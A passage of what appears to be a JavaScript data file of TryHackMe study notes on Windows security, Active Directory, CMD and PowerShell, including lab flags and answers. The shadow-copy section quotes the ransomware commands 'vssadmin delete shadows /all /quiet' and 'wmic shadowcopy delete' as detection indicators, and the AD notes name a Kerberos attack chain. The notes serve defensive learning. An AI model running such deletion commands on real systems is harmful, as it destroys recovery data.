  Last Scan        → when Defender last automatically scanned
  Quarantined Threats → isolated threats, prevented from running
  Allowed Threats  → threats you explicitly allowed (dangerous!)

VIRUS & THREAT PROTECTION SETTINGS:
  Real-time Protection         → locates and stops malware installing/running
  Cloud-delivered Protection   → faster protection using cloud data
  Automatic Sample Submission  → sends samples to Microsoft
  Controlled Folder Access     → protects folders from unauthorized changes by unknown apps
  Exclusions                   → files/folders that Defender ignores (use carefully!)
  Notifications                → critical health and security notifications

RANSOMWARE PROTECTION:
  Controlled Folder Access → must be enabled + Real-time Protection must be ON

UPDATES:
  Check for Updates → manually update Defender definitions

IMPORTANT: Real-time protection is OFF in the VM to reduce performance issues (safe in isolated lab).
TIP: Right-click any file → "Scan with Microsoft Defender" for on-demand scanning.`,
        commands: [
          '// Open Defender via PowerShell (get status):',
          'Get-MpComputerStatus',
          '// Start a quick scan via PowerShell:',
          'Start-MpScan -ScanType QuickScan',
          '// Start a full scan:',
          'Start-MpScan -ScanType FullScan',
        ],
        answer: "Real-time protection",
      },
      {
        num: 4,
        title: "Firewall & Network Protection",
        notes: `WHAT IS A FIREWALL?
Firewall controls what traffic is — and isn't — allowed through network ports.
Think of it as a security guard checking IDs at the door.

THREE FIREWALL PROFILES:
  1. Domain  → applies when host can authenticate to a Domain Controller
                (corporate/enterprise environments with Active Directory)
  2. Private → user-assigned profile for private/home networks
  3. Public  → DEFAULT profile; for public Wi-Fi (coffee shops, airports)
               ← MOST RESTRICTIVE settings

RULES FOR EACH PROFILE:
  → Turn firewall on/off per profile
  → Block all incoming connections
  → Allow specific apps through the firewall

ALLOW AN APP THROUGH FIREWALL:
  → Windows Defender Firewall → Allow an app or feature through Windows Defender Firewall
  → Shows which apps have access per profile (Private/Public)

ADVANCED SETTINGS:
  → WF.msc opens Windows Defender Firewall with Advanced Security
  → Create inbound/outbound rules, connection security rules

WARNING: Never disable Windows Defender Firewall unless you have an alternative solution in place.

AIRPORT WIFI → Public network profile (most restrictive = safest for untrusted networks)`,
        commands: [
          '// Open Firewall with Advanced Security:',
          'wf.msc',
          '// Open basic Firewall settings:',
          'firewall.cpl',
          '// Check firewall status via CMD:',
          'netsh advfirewall show allprofiles',
        ],
        answer: "Public network",
      },
      {
        num: 5,
        title: "App & Browser Control — SmartScreen",
        notes: `MICROSOFT DEFENDER SMARTSCREEN:
Protects against phishing/malware websites, dangerous apps, and potentially malicious file downloads.

CHECK APPS AND FILES:
  → SmartScreen checks unrecognized apps and files from the web
  → SmartScreen settings: Warn | Block | Off

EXPLOIT PROTECTION:
  → Built into Windows 10 and Server 2019
  → Protects device against various exploit techniques
  → Settings: individual program settings + system settings

SMARTSCREEN SETTINGS (3 options):
  Block  → blocks access to malicious sites/files
  Warn   → warns user but allows them to proceed
  Off    → disables SmartScreen (NOT recommended)

WARNING: Unless 100% confident in what you're doing, leave default settings.`,
        commands: [
          '// SmartScreen is managed through Windows Security GUI',
          '// No common CLI command for end users',
        ],
        answer: null,
      },
      {
        num: 6,
        title: "Device Security — TPM & Core Isolation",
        notes: `DEVICE SECURITY:

CORE ISOLATION:
  Memory Integrity → prevents attacks from inserting malicious code into high-security processes
  → Hypervisor-Protected Code Integrity (HVCI)
  → May impact performance on some systems

SECURITY PROCESSOR (TPM):
  TPM = Trusted Platform Module
  → Hardware-based, security-related functions chip
  → A secure crypto-processor designed to carry out cryptographic operations
  → Includes physical security mechanisms to make it tamper-resistant
  → Malicious software cannot tamper with TPM security functions

TPM USES:
  → BitLocker encryption (drive encryption)
  → Windows Hello (biometric authentication)
  → Platform integrity measurements (boot security)
  → Secure key generation and storage

TPM VERSIONS:
  TPM 1.2 → older, limited functionality
  TPM 2.0 → required for Windows 11; more secure and flexible

NOTE: TPM chips are manufactured into many newer computers by default.`,
        commands: [
          '// Check TPM status via PowerShell:',
          'Get-Tpm',
          '// Or via Run:',
          'tpm.msc',
        ],
        answer: "Trusted Platform Module",
      },
      {
        num: 7,
        title: "BitLocker",
        notes: `BITLOCKER — DEFINITION:
BitLocker Drive Encryption is a data protection feature that integrates with the OS and addresses threats of data theft from lost, stolen, or inappropriately decommissioned computers.

HOW BITLOCKER WORKS:
  → Encrypts entire volumes (drives) using AES encryption
  → Best protection when used with TPM version 1.2 or later
  → TPM stores encryption keys and ensures computer hasn't been tampered with

WITHOUT TPM:
  → BitLocker can still work but requires a STARTUP KEY stored on a removable drive
  → User must insert the USB drive each time they start the computer

WITH TPM (best protection):
  → TPM validates system integrity at boot
  → Automatically unlocks drive if system hasn't been tampered with
  → If tampering is detected, BitLocker enters recovery mode

BITLOCKER RECOVERY:
  → 48-digit recovery key is generated during setup
  → MUST be backed up to Microsoft account, AD, or printed

NOTE: BitLocker feature is NOT included in the attached VM.
NOTE: BitLocker is available on Windows Pro, Enterprise, and Education — NOT Home.`,
        commands: [
          '// Check BitLocker status:',
          'manage-bde -status',
          '// Enable BitLocker (requires admin):',
          '// Use GUI: Control Panel → BitLocker Drive Encryption',
        ],
        answer: "startup key",
      },
      {
        num: 8,
        title: "Volume Shadow Copy Service (VSS)",
        notes: `VSS — DEFINITION:
Volume Shadow Copy Service coordinates creating consistent shadow copies (snapshots / point-in-time copies) of data to be backed up.

WHAT ARE SHADOW COPIES?
  → Snapshots of a volume at a specific point in time
  → Allow recovery of files without restoring from full backup
  → Stored in: System Volume Information folder on each protected drive

IF VSS IS ENABLED (System Protection turned on), you can:
  • Create a restore point
  • Perform system restore
  • Configure restore settings
  • Delete restore points

HOW TO ACCESS:
  → System Properties → System Protection tab
  → Advanced System Settings → System Protection

SECURITY PERSPECTIVE — RANSOMWARE:
  → Malware writers specifically look for and DELETE shadow copies
  → Deleting shadow copies makes recovery from ransomware IMPOSSIBLE
  → Common ransomware commands:
    vssadmin delete shadows /all /quiet
    wmic shadowcopy delete

DEFENCE AGAINST RANSOMWARE:
  → Offline backups (disconnected from the network) are the ONLY reliable defence
  → VSS/shadow copies are NOT sufficient protection against ransomware

NOTE: If you see vssadmin delete shadows in logs → RANSOMWARE INDICATOR`,
        commands: [
          '// List shadow copies:',
          'vssadmin list shadows',
          '// Create shadow copy (requires admin):',
          'vssadmin create shadow /for=C:',
          '// View shadow copies:',
          'wmic shadowcopy get /all',
        ],
        answer: "Volume Shadow Copy Service",
      },
    ],
    tools: ["Windows Defender", "Windows Firewall", "BitLocker", "SmartScreen", "VSS"],
    mitre: [
      "T1490 — Inhibit System Recovery (VSS deletion by ransomware)",
      "T1562.001 — Impair Defenses: Disable or Modify Tools (Defender)",
      "T1486 — Data Encrypted for Impact (Ransomware + BitLocker abuse)",
    ],
    personalNotes:
      "VSS deletion command (vssadmin delete shadows /all) is a critical ransomware indicator to hunt for in logs. BitLocker + TPM is the gold standard for endpoint encryption. SmartScreen bypass is a common initial access technique. Patch Tuesday = 2nd Tuesday of each month.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "active-directory-basics",
    title: "Active Directory Basics",
    platform: "TryHackMe",
    category: "Active Directory",
    difficulty: "Easy",
    icon: "🏢",
    completed: true,
    tags: ["Active Directory", "Domain Controller", "GPO", "Kerberos", "LDAP", "OUs", "Trust Relationships"],
    overview:
      "Introduction to Active Directory (AD) — the backbone of corporate Windows environments. Covers Windows domains, AD objects (users, machines, groups), Organizational Units (OUs), Group Policy Objects (GPOs), Kerberos and NetNTLM authentication, and the trust model for Trees/Forests.",
    keyLearnings: [
      "Windows Domain = group of users and computers under a single AD repository (centralised management)",
      "Domain Controller (DC) = server that runs Active Directory Domain Services (AD DS)",
      "Security principals = objects that can be authenticated: users, machines, groups",
      "Machine account naming: computer name + $ (e.g. DC01$) — password auto-rotated every 120 random chars",
      "OUs (Organizational Units) = containers for applying policies; a user can only be in ONE OU",
      "Security Groups = for granting permissions to resources; a user can be in MANY groups",
      "GPOs distributed via SYSVOL share (C:\\Windows\\SYSVOL\\sysvol\\) on each DC",
      "Kerberos = default auth in modern Windows; uses TGT and TGS tickets via KDC",
      "NetNTLM = legacy challenge-response auth; password never transmitted over network",
      "Tree = multiple domains sharing the same namespace; Forest = multiple trees",
      "Trust relationships allow users from one domain to access resources in another",
    ],
    tasks: [
      {
        num: 1,
        title: "Windows Domains",
        notes: `PROBLEM WITHOUT A DOMAIN:
  Small network (5 computers) → manual configuration is manageable
  Large network (157 computers, 320 users, 4 offices) → impossible to manage manually

SOLUTION — WINDOWS DOMAIN:
  → A group of users and computers under the administration of a given business
  → Centralised administration via Active Directory (AD)
  → Server running AD services = Domain Controller (DC)

MAIN ADVANTAGES:
  1. Centralised Identity Management: configure all users from one place
  2. Managing Security Policies: deploy policies to users/computers across the network
  3. Single Sign-On: same credentials work on any domain-joined computer

REAL-WORLD EXAMPLE:
  → School/university networks: log into ANY campus computer with ONE set of credentials
  → AD forwards auth to Domain Controller — credentials don't need to exist on each machine
  → School can also restrict Control Panel access via AD policies

IMPORTANT TERMINOLOGY:
  Active Directory = the centralised repository/catalogue
  Domain Controller (DC) = server running the Active Directory services
  THM.local = example domain name in this room`,
        commands: [
          '// Join a computer to a domain (PowerShell):',
          'Add-Computer -DomainName THM.local -Credential THM\\Administrator',
          '// Check domain membership:',
          'systeminfo | findstr /B /C:"Domain"',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "Active Directory Objects",
        notes: `AD DS (Active Directory Domain Services):
Acts as a catalogue holding information about ALL objects on the network.

OBJECT TYPES:

USERS (Security Principals):
  → Can be authenticated by domain and assigned privileges
  → Two types:
    People: represent employees needing network access
    Services: accounts for IIS, MSSQL, etc. (minimal privileges)

MACHINES (Security Principals):
  → For every computer joining the domain, a machine object is created
  → Naming: computer name + $ (DC01 → DC01$)
  → Machine account passwords: auto-rotated, 120 random characters
  → Local administrators of their own computer

SECURITY GROUPS:
  → Assign access rights to files/resources for entire groups
  → Users/machines can be members; groups can contain groups

KEY DEFAULT SECURITY GROUPS:
  Domain Admins     → admin privileges over ENTIRE domain and all DCs
  Server Operators  → administer DCs, cannot change admin group memberships
  Backup Operators  → access ANY file ignoring permissions (for backup purposes)
  Account Operators → can create or modify other accounts
  Domain Users      → all existing user accounts in domain
  Domain Computers  → all existing computers in domain
  Domain Controllers → all existing DCs on the domain

IMPORTANT DISTINCTION:
  OUs → for applying POLICIES (user can be in only ONE OU)
  Security Groups → for granting PERMISSIONS (user can be in MANY groups)`,
        commands: [
          '// Open Active Directory Users and Computers:',
          'dsa.msc',
          '// Create new OU via PowerShell:',
          'New-ADOrganizationalUnit -Name "Students" -Path "OU=THM,DC=thm,DC=local"',
          '// List all users in a domain:',
          'Get-ADUser -Filter *',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "Managing Users in AD",
        notes: `MANAGING OUs AND USERS:

DEFAULT CONTAINERS (created by Windows automatically):
  Builtin           → default groups for any Windows host
  Computers         → machines joining the network go here by default
  Domain Controllers → where DCs live
  Users             → default users and groups (domain-wide context)
  Managed Service Accounts → service accounts

DELETING PROTECTED OUs:
  → By default, OUs are protected against accidental deletion
  → To delete: View → Advanced Features → right-click OU → Properties
  → Object tab → uncheck "Protect object from accidental deletion"

DELEGATION:
  → Granting specific users control over specific OUs without making them Domain Admin
  → Common use case: IT support can reset passwords in their assigned OUs
  → Right-click OU → "Delegate Control" → select user → assign tasks

RESETTING PASSWORDS VIA POWERSHELL (as Phillip/IT support):
  Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose

FORCE PASSWORD CHANGE ON NEXT LOGON:
  Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose

NOTE: When delegating password reset, the IT user doesn't need ADUC open — they use PowerShell.`,
        commands: [
          '// Reset AD user password (PowerShell):',
          'Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt "New Password") -Verbose',
          '// Force password change at next logon:',
          'Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose',
          '// Unlock a locked-out account:',
          'Unlock-ADAccount -Identity sophie',
        ],
        answer: "THM{thanks_for_contacting_support}",
      },
      {
        num: 4,
        title: "Managing Computers in AD",
        notes: `COMPUTER MANAGEMENT IN AD:

BY DEFAULT: All computers join the "Computers" container.

PROBLEM: All devices in one container = same policies applied to everything.

BEST PRACTICE — SEGREGATE DEVICES INTO OUs:
  1. Workstations → regular user desktops and laptops
     → Never have privileged users signed in
     → Most common device type
  2. Servers → provide services to users or other servers
     → More security controls needed
  3. Domain Controllers → manage the AD domain
     → Most sensitive devices in the network
     → Contain hashed passwords for ALL domain user accounts
     → Already have their own default OU

PROCESS:
  1. Create "Workstations" and "Servers" OUs directly under the domain
  2. Move computers from the default "Computers" container to appropriate OUs
  3. Configure different GPOs per OU

ANSWER: After organizing computers in this room → 7 ended up in Workstations OU`,
        commands: [
          '// Move computer to new OU via PowerShell:',
          'Move-ADObject -Identity "CN=PC01,CN=Computers,DC=thm,DC=local" -TargetPath "OU=Workstations,DC=thm,DC=local"',
          '// List computers in a specific OU:',
          'Get-ADComputer -Filter * -SearchBase "OU=Workstations,DC=thm,DC=local"',
        ],
        answer: null,
      },
      {
        num: 5,
        title: "Group Policies (GPOs)",
        notes: `GPOs (GROUP POLICY OBJECTS):
Collections of settings that can be applied to OUs. Define security baselines and configurations.

ACCESSING GROUP POLICY MANAGEMENT:
  → Start Menu → Group Policy Management
  → Or: gpmc.msc

WORKFLOW:
  1. Create a GPO under "Group Policy Objects"
  2. Link the GPO to the OU where policies should apply
  3. GPO applies to the linked OU AND all sub-OUs
  4. Use gpupdate /force to immediately apply changes

DEFAULT GPOs:
  Default Domain Policy → linked to entire domain, applies to all
  Default Domain Controllers Policy → linked to Domain Controllers OU only
  RDP Policy → linked to domain (in this room's example)

GPO SCOPE AND FILTERING:
  → By default applies to "Authenticated Users" group (all users/PCs)
  → Security Filtering allows restricting to specific users/computers

EXAMPLE GPOs CREATED IN THIS ROOM:
  "Restrict Control Panel Access" → linked to Sales, Marketing, Management OUs
    Location: User Configuration → Administrative Templates → Control Panel
    Setting: Prohibit Access to Control Panel and PC settings → Enabled

  "Auto Lock Screen" → linked to root domain (affects all OUs including Workstations, Servers, DCs)
    Location: Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
    Setting: Interactive logon: Machine inactivity limit → 300 seconds (5 minutes)

GPO DISTRIBUTION:
  → Distributed via SYSVOL network share on each DC
  → Path: C:\\Windows\\SYSVOL\\sysvol\\
  → All domain users have access to SYSVOL to sync GPOs
  → Updates take up to 2 hours to propagate
  → Force immediate update: gpupdate /force`,
        commands: [
          'gpmc.msc',
          '// Force immediate GPO update on a machine:',
          'gpupdate /force',
          '// Check applied GPOs:',
          'gpresult /r',
          '// Check GPOs in verbose mode:',
          'gpresult /v',
        ],
        answer: "sysvol",
      },
      {
        num: 6,
        title: "Authentication Methods — Kerberos and NetNTLM",
        notes: `TWO WINDOWS DOMAIN AUTH PROTOCOLS:

─── KERBEROS (Default in modern Windows) ───

KEY COMPONENTS:
  KDC (Key Distribution Center) = service on DC that creates Kerberos tickets
  TGT (Ticket Granting Ticket) = proof of authentication; used to request TGS tickets
  TGS (Ticket Granting Service) = ticket for a specific service
  Session Key = used to authenticate to the KDC
  Service Session Key = used to authenticate to the specific service

KERBEROS FLOW (3 Steps):
  STEP 1 — Getting the TGT:
  → User sends username + timestamp encrypted with password-derived key to KDC
  → KDC returns TGT + Session Key
  → TGT is encrypted with krbtgt account's password hash (user can't read it)

  STEP 2 — Getting the TGS:
  → User sends TGT + username + timestamp (encrypted with Session Key) + SPN to KDC
  → KDC returns TGS + Service Session Key
  → TGS encrypted with Service Owner's password hash

  STEP 3 — Accessing the Service:
  → User sends TGS to the service
  → Service decrypts TGS using its own account's password hash
  → Service validates Service Session Key and grants access

─── NETNTLM (Legacy — kept for compatibility) ───

CHALLENGE-RESPONSE MECHANISM (6 Steps):
  1. Client sends auth request to server
  2. Server sends random CHALLENGE number to client
  3. Client combines NTLM hash + challenge + known data → generates RESPONSE
  4. Server forwards challenge + response to Domain Controller
  5. DC recalculates response and compares to client's response
  6. Auth result sent back to server, then to client

KEY POINT: Password/hash NEVER transmitted over the network directly
LOCAL ACCOUNT: Server can verify locally without contacting DC (uses SAM)`,
        commands: [
          '// Check Kerberos tickets on Windows:',
          'klist',
          '// Purge Kerberos ticket cache:',
          'klist purge',
          '// Request new TGT (PowerShell):',
          'Add-Type -AssemblyName System.IdentityModel',
        ],
        answer: null,
      },
      {
        num: 7,
        title: "Trees, Forests, and Trusts",
        notes: `SINGLE DOMAIN:
  → Simple setup for small organisations
  → One DC manages everything

TREES:
  → Multiple domains sharing the SAME NAMESPACE
  → Example: thm.local + uk.thm.local + us.thm.local = Tree
  → Each domain has its own DC and AD
  → Enterprise Admins group → admin privileges over ALL domains in enterprise
  → Domain Admins → admin over their SINGLE domain only

WHY TREES?
  → Company expands to new country with different laws/regulations
  → Different IT teams per region — each manages their own DC independently

FORESTS:
  → Multiple TREES with DIFFERENT NAMESPACES joined together
  → Example: thm.local tree + mhtgroup.local tree = Forest
  → Created when companies merge or acquire each other
  → Each tree managed by its own IT department

TRUST RELATIONSHIPS:
  → Allow users from one domain to access resources in another domain
  → WITHOUT trusts, domains are completely isolated

ONE-WAY TRUST:
  → If Domain AAA trusts Domain BBB:
  → Users from BBB can be authorised to access resources in AAA
  → Direction of trust is OPPOSITE to direction of access

TWO-WAY TRUST:
  → Both domains mutually authorise each other's users
  → Default when joining domains in a tree or forest

IMPORTANT: Trust ≠ automatic access. Trust allows you to AUTHORISE users — still must configure what they can access.`,
        commands: [
          '// View trust relationships (PowerShell):',
          'Get-ADTrust -Filter *',
          '// View trust in GUI:',
          '// Active Directory Domains and Trusts → right-click domain → Properties → Trusts tab',
          'netdom query trust',
        ],
        answer: null,
      },
    ],
    tools: ["Active Directory Users and Computers (ADUC)", "Group Policy Management (GPMC)", "PowerShell AD Module"],
    mitre: [
      "T1558 — Steal or Forge Kerberos Tickets",
      "T1558.003 — Kerberoasting",
      "T1484 — Domain Policy Modification (GPO abuse)",
      "T1078.002 — Valid Accounts: Domain Accounts",
    ],
    personalNotes:
      "Kerberos attack chain: AS-REP Roasting (no pre-auth needed) → Kerberoasting (TGS for cracking) → Golden Ticket (krbtgt hash). GPO abuse is massive in AD pentesting — always check who can edit GPOs. SYSVOL path is exam-critical. Trust relationships enable lateral movement across domains in forests.",
  },

  // ═══════════════════════════════════════════════════════
  // COMMAND LINE
  // ═══════════════════════════════════════════════════════

  {
    id: "windows-command-line",
    title: "Windows Command Line",
    platform: "TryHackMe",
    category: "Windows",
    difficulty: "Easy",
    icon: "💻",
    completed: true,
    tags: ["CMD", "cmd.exe", "ipconfig", "netstat", "tasklist", "taskkill", "Windows CLI"],
    overview:
      "Learn essential Windows command prompt (cmd.exe) commands for displaying system information, network troubleshooting, file and directory management, and process management. Covers hostname, whoami, systeminfo, ipconfig, netstat, tasklist, taskkill, and more.",
    keyLearnings: [
      "cmd.exe = default command-line interpreter in the Windows environment",
      "set command shows the Windows PATH variable",
      "ver = OS version | systeminfo = detailed system info | hostname = computer name | whoami = current user",
      "ipconfig /all shows MAC address, DNS, DHCP details",
      "netstat -abon shows all connections, processes, and executables per connection",
      "nslookup resolves domain names to IP addresses",
      "tasklist /FI shows filtered process list by criteria",
      "taskkill /PID <pid> terminates a process by PID",
      "shutdown /r = restart | shutdown /s = shutdown | shutdown /a = abort scheduled shutdown",
      "dir /a shows hidden/system files | dir /s shows files in all subdirectories",
    ],
    tasks: [
      {
        num: 1,
        title: "Basic System Information",
        notes: `BASIC COMMANDS:

set → shows all environment variables (including PATH)
ver → shows Windows OS version
  Example output: Microsoft Windows [Version 10.0.17763.1821]

systeminfo → comprehensive system info:
  • Host Name
  • OS Name, Version, Build
  • Manufacturer
  • Configuration (Standalone Server, Domain Member, etc.)
  • Processor info
  • RAM details

UTILITY COMMANDS:
  help <command> → provides help for a specific command
  cls            → clears the Command Prompt screen
  <command> /? → shows manual/help for most commands
  <command> | more → pipe long output to view page by page
    → Press SPACE to advance one page
    → Press CTRL+C to exit

TIPS:
  → driverquery → lists all installed drivers
  → driverquery | more → page by page view
  → Commands execute from within the Windows PATH`,
        commands: [
          'set',
          'ver',
          'systeminfo',
          'hostname',
          'whoami',
          'cls',
          'help dir',
          'ipconfig /?',
          'driverquery | more',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "Network Troubleshooting",
        notes: `NETWORK CONFIGURATION:
  ipconfig                → basic IP config (IP, subnet, gateway)
  ipconfig /all           → full details (MAC, DNS, DHCP, lease times)
  ipconfig /release       → release DHCP lease
  ipconfig /renew         → renew DHCP lease
  ipconfig /flushdns      → flush DNS resolver cache

CONNECTIVITY TESTING:
  ping <target>           → send 4 ICMP packets, shows RTT
  ping -t <target>        → continuous ping until stopped
  ping -n 10 <target>     → ping exactly 10 times

ROUTE TRACING:
  tracert <target>        → trace route showing each hop (router)
  → Shows IP of each router, response time per hop
  → * = router didn't respond / blocked ICMP

DNS LOOKUP:
  nslookup example.com            → lookup using default DNS server
  nslookup example.com 1.1.1.1   → lookup using specific DNS server (1.1.1.1)

CONNECTIONS AND PORTS:
  netstat                  → established TCP connections
  netstat -a               → all connections AND listening ports
  netstat -b               → shows EXECUTABLE per connection
  netstat -o               → shows PID per connection
  netstat -n               → numeric format (no hostname resolution)
  netstat -abon            → all options combined (most useful)

NET COMMAND:
  net help                 → shows help (NOT net /?)
  net help user            → help for net user subcommand
  net user                 → list/manage user accounts
  net localgroup           → list/manage local groups
  net share                → list/manage shared resources
  net session              → list active sessions`,
        commands: [
          'ipconfig',
          'ipconfig /all',
          'ipconfig /flushdns',
          'ping 8.8.8.8',
          'ping -n 10 example.com',
          'tracert example.com',
          'nslookup example.com',
          'nslookup example.com 1.1.1.1',
          'netstat',
          'netstat -abon',
          'net help user',
          'net user',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "File and Disk Management",
        notes: `DIRECTORY NAVIGATION:
  cd              → shows current drive and directory (where am I?)
  cd <dir>        → navigate into directory
  cd ..           → go up one level
  dir             → list files in current directory
  dir /a          → show ALL files including hidden and system files
  dir /s          → show files in current dir AND all subdirectories
  tree            → visual representation of directory structure

FILE OPERATIONS:
  type <file>     → display contents of a text file
  more <file>     → display file contents page by page
  copy <src> <dst>   → copy file to new location
  move <src> <dst>   → move (or rename) a file
  del <file>      → delete a file
  erase <file>    → delete a file (same as del)
  * wildcard      → refer to multiple files (e.g. copy *.md C:\\Markdown)

DIRECTORY OPERATIONS:
  mkdir <name>    → create a new directory
  rmdir <name>    → remove a directory (must be empty)
  rmdir /s <name> → remove directory and ALL contents (use carefully!)

IMPORTANT NOTES:
  → cd without parameters = shows current directory (useful orientation check)
  → Use tree to visualize nested folder structure
  → No recycle bin in CMD — del is PERMANENT`,
        commands: [
          'cd', 'cd Users', 'cd ..', 'cd C:\\Windows\\System32',
          'dir', 'dir /a', 'dir /s',
          'tree',
          'type C:\\file.txt',
          'more C:\\longfile.txt',
          'copy test.txt test_backup.txt',
          'copy *.txt C:\\Backups\\',
          'move file.txt C:\\NewLocation\\',
          'move oldname.txt newname.txt',
          'del oldfile.txt',
          'mkdir NewFolder',
          'rmdir /s OldFolder',
        ],
        answer: "THM{CLI_POWER}",
      },
      {
        num: 4,
        title: "Task and Process Management",
        notes: `VIEWING PROCESSES:
  tasklist                          → list all running processes
  tasklist /FI "imagename eq X.exe" → filter by executable name
  tasklist /?                       → show all available filters

tasklist OUTPUT COLUMNS:
  Image Name | PID | Session Name | Session# | Mem Usage

USEFUL TASKLIST FILTERS:
  /FI "imagename eq notepad.exe"    → find notepad processes
  /FI "pid eq 1234"                 → find process with specific PID
  /FI "status eq running"           → show only running processes
  /FI "memusage gt 10000"           → processes using >10MB RAM

KILLING PROCESSES:
  taskkill /PID <pid>               → terminate process by PID
  taskkill /IM notepad.exe          → terminate all notepad instances
  taskkill /F /PID <pid>            → forcefully terminate (like kill -9)

SYSTEM SHUTDOWN:
  shutdown /s                       → shut down the system
  shutdown /r                       → RESTART the system
  shutdown /l                       → log off current user
  shutdown /a                       → ABORT a pending scheduled shutdown
  shutdown /s /t 60                 → shut down after 60 seconds
  shutdown /r /t 0                  → restart immediately`,
        commands: [
          'tasklist',
          'tasklist /FI "imagename eq notepad.exe"',
          'tasklist /FI "imagename eq sshd.exe"',
          'taskkill /PID 1516',
          'taskkill /IM notepad.exe',
          'taskkill /F /PID 1516',
          'shutdown /r',
          'shutdown /s /t 60',
          'shutdown /a',
        ],
        answer: null,
      },
    ],
    tools: ["cmd.exe", "ipconfig", "netstat", "tasklist", "taskkill", "nslookup"],
    mitre: [
      "T1057 — Process Discovery (tasklist)",
      "T1049 — System Network Connections Discovery (netstat)",
      "T1016 — System Network Configuration Discovery (ipconfig)",
    ],
    personalNotes:
      "netstat -abon is the gold standard for finding malicious network connections with their associated processes. tasklist /FI filters are powerful for hunting specific processes. Remember: net help (not net /?) for help on net subcommands.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "windows-powershell",
    title: "Windows PowerShell",
    platform: "TryHackMe",
    category: "Windows",
    difficulty: "Easy",
    icon: "💠",
    completed: true,
    tags: ["PowerShell", "Cmdlets", "Pipelines", "Get-Process", "Get-Service", "Scripting", "Invoke-Command"],
    overview:
      "Introduction to PowerShell — Microsoft's cross-platform task automation solution built on .NET. Covers the object-oriented approach, basic cmdlets (Get-Command, Get-Help, Get-Alias), file system navigation, piping and filtering (Where-Object, Sort-Object, Select-String), system/network information gathering, real-time analysis, and scripting fundamentals.",
    keyLearnings: [
      "PowerShell = object-oriented; cmdlets return objects with properties and methods, not plain text",
      "Cmdlet naming convention: Verb-Noun (e.g. Get-Content, Set-Location)",
      "Get-Command lists all available cmdlets | Get-Help provides detailed info | Get-Alias shows aliases",
      "dir = Get-ChildItem | cd = Set-Location | cat = Get-Content | echo = Write-Output",
      "Piping (|) passes objects — not just text — between cmdlets",
      "Where-Object filters objects | Sort-Object sorts | Select-Object selects properties",
      "Get-ComputerInfo, Get-LocalUser, Get-NetIPConfiguration for system/network info",
      "Get-Process (ps), Get-Service, Get-NetTCPConnection for real-time analysis",
      "Get-FileHash generates file hashes (SHA256 by default) for integrity checking",
      "Invoke-Command executes commands on remote machines",
      "ADS can be viewed with: Get-Item -Path 'file.txt' -Stream *",
    ],
    tasks: [
      {
        num: 1,
        title: "What Is PowerShell",
        notes: `POWERSHELL — DEFINITION:
"A cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework." — Microsoft

KEY DIFFERENCES FROM cmd.exe:
  cmd.exe  → text-based; processes/outputs plain text
  PowerShell → object-oriented; cmdlets return OBJECTS with properties and methods

HISTORY:
  → Developed by Jeffrey Snover (Microsoft engineer)
  → Problem: Windows used structured data/APIs, Unix treated everything as text files
  → Solution: object-oriented approach combining scripting simplicity with .NET power
  → Released 2006 as Windows PowerShell
  → 2016: PowerShell Core released as open-source and cross-platform (Windows, macOS, Linux)

THE POWER — OBJECTS:
  In programming, an object has:
  → Properties (characteristics): Color, Model, FuelLevel
  → Methods (actions): Drive(), HonkHorn(), Refuel()

  PowerShell objects can be:
  → File objects (with properties: Name, Length, LastWriteTime)
  → Process objects (with properties: Name, Id, CPU)
  → Service objects (with properties: Name, Status, StartType)

LAUNCHING POWERSHELL:
  → Start Menu → type "powershell"
  → Win + R → type "powershell"
  → File Explorer address bar → type "powershell"
  → From cmd.exe → type "powershell"`,
        commands: [
          '// Launch from cmd.exe:',
          'powershell',
          '// Check version:',
          '$PSVersionTable',
          '// Check execution policy:',
          'Get-ExecutionPolicy',
        ],
        answer: "object-oriented",
      },
      {
        num: 2,
        title: "PowerShell Basics",
        notes: `CMDLET SYNTAX: Verb-Noun

KEY CMDLETS:

Get-Command → lists ALL available cmdlets, functions, aliases, scripts
  Get-Command -CommandType "Function"     → filter by type
  Get-Command -Name "Remove*"             → filter by name pattern

Get-Help → detailed info about cmdlets (usage, parameters, examples)
  Get-Help Get-Date                        → basic help
  Get-Help Get-Date -examples             → show usage examples
  Get-Help Get-Date -detailed             → detailed help
  Get-Help Get-Date -full                 → complete documentation

Get-Alias → lists all aliases (shortcuts for cmdlets)
  → dir is alias for Get-ChildItem
  → cd is alias for Set-Location
  → cat is alias for Get-Content
  → echo is alias for Write-Output
  → ls is alias for Get-ChildItem
  → ps is alias for Get-Process

FINDING AND INSTALLING MODULES (requires internet):
  Find-Module -Name "PowerShell*"         → search module in PSGallery
  Install-Module -Name "PowerShellGet"    → install module from PSGallery`,
        commands: [
          'Get-Command',
          'Get-Command -CommandType "Function"',
          'Get-Command -Name Remove*',
          'Get-Help Get-Date',
          'Get-Help Get-Date -examples',
          'Get-Help New-LocalUser -examples',
          'Get-Alias',
          '// Find what alias maps to:',
          'Get-Alias dir',
          '// Find alias for a specific cmdlet:',
          'Get-Alias -Definition Get-ChildItem',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "File System Navigation and Management",
        notes: `FILE SYSTEM CMDLETS:

Get-ChildItem (alias: dir, ls)
  Get-ChildItem                    → list current directory
  Get-ChildItem -Path C:\\Users    → list specific directory

Set-Location (alias: cd)
  Set-Location -Path ".\\Documents"  → navigate to Documents
  Set-Location ..                    → go up one level

New-Item → create files AND directories
  New-Item -Path ".\\folder" -ItemType "Directory"
  New-Item -Path ".\\file.txt" -ItemType "File"

Remove-Item → delete files AND directories
  Remove-Item -Path ".\\file.txt"
  Remove-Item -Path ".\\folder"

Copy-Item (alias: copy, cp)
  Copy-Item -Path .\\file.txt -Destination .\\file_backup.txt

Move-Item (alias: move, mv)
  Move-Item -Path .\\file.txt -Destination .\\OtherFolder\\

Get-Content (alias: cat, type)
  Get-Content -Path ".\\file.txt"   → read and display file contents

NOTE: PowerShell uses SINGLE cmdlet set for both files and directories
